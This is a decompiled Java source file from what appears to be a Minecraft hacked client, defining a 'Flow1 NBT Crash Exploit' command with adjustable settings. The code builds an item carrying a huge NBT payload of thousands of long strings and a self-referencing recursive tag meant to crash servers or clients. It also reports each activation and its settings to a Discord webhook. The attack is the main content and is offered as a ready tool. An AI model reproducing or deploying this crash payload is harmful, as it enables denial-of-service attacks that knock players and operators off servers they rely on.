package org.jon.magicclient.client.crashers;

import java.util.Collections;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_310;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.MessageHelper;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionUtil;

public class Flow1 implements Command {
   private boolean enabled = false;
   private ScheduledExecutorService hn;
   private final MessageHelper msgHelper = new MessageHelper();
   private int listSize = 1000;
   private int stringSize = 10000;
   private int hugeStringSize = 100000;
   private boolean sendPackets = false;
   private int packetDelay = 100;
   private int packetCount = 10;

   public String getName() {
      return "flow1";
   }

   public boolean getEnabled() {
      return this.enabled;
   }

   public void setEnabled(boolean enabled) {
      this.enabled = enabled;
      String config = "ListSize=" + this.listSize + ", StringSize=" + this.stringSize + ", HugeStringSize=" + this.hugeStringSize + ", SendPackets=" + this.sendPackets + ", PacketDelay=" + this.packetDelay + ", PacketCount=" + this.packetCount;
      if (enabled) {
         DiscordWebhookSender.sendCrasherActivation("Flow1", config);
         this.hn = Executors.newSingleThreadScheduledExecutor();
         this.msgHelper.sendMessage("&aFlow1 enabled!", true);
      } else {
         DiscordWebhookSender.sendCrasherCompletion("Flow1", config, true);
         if (this.hn != null) {
            this.hn.shutdown();
         }

         this.msgHelper.sendMessage("&cFlow1 disabled!", true);
      }

   }

   public String getDescription() {
      return "Flow1 NBT Crash Exploit";
   }

   public void onCommand(String[] args) {
      if (args.length > 1) {
         if (args[1].equalsIgnoreCase("on")) {
            this.setEnabled(true);
            return;
         }

         if (args[1].equalsIgnoreCase("off")) {
            this.setEnabled(false);
            return;
         }

         int newDelay;
         if (args[1].equalsIgnoreCase("size")) {
            if (args.length > 2) {
               try {
                  newDelay = Integer.parseInt(args[2]);
                  if (newDelay > 0 && newDelay <= 10000) {
                     this.listSize = newDelay;
                     this.msgHelper.sendMessage("&aFlow1 list size set to: " + this.listSize, true);
                  } else {
                     this.msgHelper.sendMessage("&cSize must be between 1 and 10000!", true);
                  }
               } catch (NumberFormatException var8) {
                  this.msgHelper.sendMessage("&cInvalid size format!", true);
               }
            } else {
               this.msgHelper.sendMessage("&eCurrent list size: " + this.listSize, true);
            }

            return;
         }

         if (args[1].equalsIgnoreCase("packets")) {
            if (args.length > 2) {
               if (args[2].equalsIgnoreCase("on")) {
                  this.sendPackets = true;
                  this.msgHelper.sendMessage("&aFlow1 packets enabled!", true);
               } else if (args[2].equalsIgnoreCase("off")) {
                  this.sendPackets = false;
                  this.msgHelper.sendMessage("&cFlow1 packets disabled!", true);
               } else {
                  if (args[2].equalsIgnoreCase("count")) {
                     if (args.length > 3) {
                        try {
                           newDelay = Integer.parseInt(args[3]);
                           if (newDelay > 0 && newDelay <= 100) {
                              this.packetCount = newDelay;
                              this.msgHelper.sendMessage("&aFlow1 packet count set to: " + this.packetCount, true);
                           } else {
                              this.msgHelper.sendMessage("&cPacket count must be between 1 and 100!", true);
                           }
                        } catch (NumberFormatException var9) {
                           this.msgHelper.sendMessage("&cInvalid packet count format!", true);
                        }
                     } else {
                        this.msgHelper.sendMessage("&eCurrent packet count: " + this.packetCount, true);
                     }

                     return;
                  }

                  if (args[2].equalsIgnoreCase("delay")) {
                     if (args.length > 3) {
                        try {
                           newDelay = Integer.parseInt(args[3]);
                           if (newDelay >= 0 && newDelay <= 5000) {
                              this.packetDelay = newDelay;
                              this.msgHelper.sendMessage("&aFlow1 packet delay set to: " + this.packetDelay + "ms", true);
                           } else {
                              this.msgHelper.sendMessage("&cPacket delay must be between 0 and 5000ms!", true);
                           }
                        } catch (NumberFormatException var10) {
                           this.msgHelper.sendMessage("&cInvalid delay format!", true);
                        }
                     } else {
                        this.msgHelper.sendMessage("&eCurrent packet delay: " + this.packetDelay + "ms", true);
                     }

                     return;
                  }
               }
            } else {
               this.msgHelper.sendMessage("&eFlow1 packets: " + (this.sendPackets ? "enabled" : "disabled"), true);
               this.msgHelper.sendMessage("&ePacket count: " + this.packetCount, true);
               this.msgHelper.sendMessage("&ePacket delay: " + this.packetDelay + "ms", true);
            }

            return;
         }

         if (args[1].equalsIgnoreCase("config")) {
            this.msgHelper.sendMessage("&e=== Flow1 Configuration ===", true);
            int var10001 = this.listSize;
            this.msgHelper.sendMessage("&eList size: " + var10001, true);
            var10001 = this.stringSize;
            this.msgHelper.sendMessage("&eString size: " + var10001, true);
            var10001 = this.hugeStringSize;
            this.msgHelper.sendMessage("&eHuge string size: " + var10001, true);
            this.msgHelper.sendMessage("&eSend packets: " + (this.sendPackets ? "enabled" : "disabled"), true);
            this.msgHelper.sendMessage("&ePacket count: " + this.packetCount, true);
            this.msgHelper.sendMessage("&ePacket delay: " + this.packetDelay + "ms", true);
            this.msgHelper.sendMessage("&eUsage: !flow1 size <1-10000>", true);
            this.msgHelper.sendMessage("&eUsage: !flow1 packets on/off", true);
            this.msgHelper.sendMessage("&eUsage: !flow1 packets count <1-100>", true);
            this.msgHelper.sendMessage("&eUsage: !flow1 packets delay <0-5000>", true);
            return;
         }
      }

      if (!this.enabled) {
         this.msgHelper.sendMessage("&cFlow1 is not enabled!", true);
      } else {
         class_310 mc = class_310.method_1551();
         if (mc.field_1724 == null) {
            this.msgHelper.sendMessage("&cYou must be in a world to use this!", true);
         } else {
            try {
               class_1799 stack = new class_1799(class_1802.field_20391);
               class_2487 tag = new class_2487();
               class_2499 list = new class_2499();

               for(int i = 0; i < this.listSize; ++i) {
                  class_2487 nestedTag = new class_2487();
                  nestedTag.method_10582("crash" + i, "x".repeat(this.stringSize));
                  list.add(nestedTag);
               }

               tag.method_10566("crash_list", list);
               tag.method_10582("huge_string", "x".repeat(this.hugeStringSize));
               class_2487 recursive = new class_2487();
               recursive.method_10566("recursive", recursive);
               tag.method_10566("recursive_crash", recursive);
               stack.method_7980(tag);
               this.msgHelper.sendMessage("&aFlow1 NBT crash payload created! Size: " + this.listSize, true);
               if (this.sendPackets) {
                  this.msgHelper.sendMessage("&aPacket sending would be enabled (NBT size: " + this.listSize + ")", true);
               } else {
                  this.msgHelper.sendMessage("&ePacket sending disabled", true);
               }
            } catch (Exception var11) {
               this.msgHelper.sendMessage("&cError executing Flow1: " + var11.getMessage(), true);
            }

         }
      }
   }

   public String getArgsUsage() {
      return "";
   }

   public List<OptionUtil> getOptions() {
      return Collections.emptyList();
   }

   public GuiCategory getCategory() {
      return GuiCategory.CRASHES;
   }
}
